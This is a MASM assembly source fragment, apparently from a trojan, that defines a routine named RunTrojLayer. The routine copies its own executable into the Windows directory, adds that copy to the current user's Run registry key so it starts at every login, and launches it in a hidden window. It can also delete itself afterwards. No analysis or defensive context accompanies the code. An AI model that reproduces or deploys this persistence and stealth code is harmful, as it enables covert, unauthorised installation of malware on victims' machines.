	.data
                szAutoPath      db      "SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0

        .code

; #########################################################################

RunTrojLayer proc
        LOCAL   hkHandle: DWORD

        invoke  GetWindowsDirectory, offset lpBuf1, MAX_PATH+1
        invoke  GetModuleFileName, NULL, offset lpBuf2, MAX_PATH+1

        lea     eax, lpBuf2
        xor     edx, edx
@loop:
        cmp     byte ptr[eax], '\'
        jne     @next
        mov     edx, eax
@next:
        inc     eax
        cmp     byte ptr[eax], 0
        jnz     @loop

;        invoke  lstrcat, offset lpBuf1, edx
        invoke  lstrcat, offset lpBuf1, offset exename
;        invoke  lstrcmp, offset lpBuf1, offset lpBuf2
        test    eax, eax
        jz      @ret ; running from windows directory, do nothing

	invoke  RegCreateKey, HKEY_CURRENT_USER, offset szAutoPath, addr hkHandle
        test    eax, eax
        jnz     @F


        invoke  CopyFile, offset lpBuf2, offset lpBuf1, 0
        test    eax, eax
        jz      @exit ; file cannot be copied: it's running already

        
        invoke  lstrlen, offset lpBuf1
        invoke  RegSetValueEx, hkHandle, offset szAutoName, 0, REG_SZ, offset lpBuf1, eax

        invoke  RegCloseKey, hkHandle

@@:
        invoke  ShellExecute, 0, offset szTextOpen, offset lpBuf1, 0, 0, SW_HIDE
@exit:
        IFDEF   MOD_SELFDELETE
                call  DoSelfDelete
        ENDIF
        invoke  ExitProcess, 0
@ret:
        ret
RunTrojLayer endp
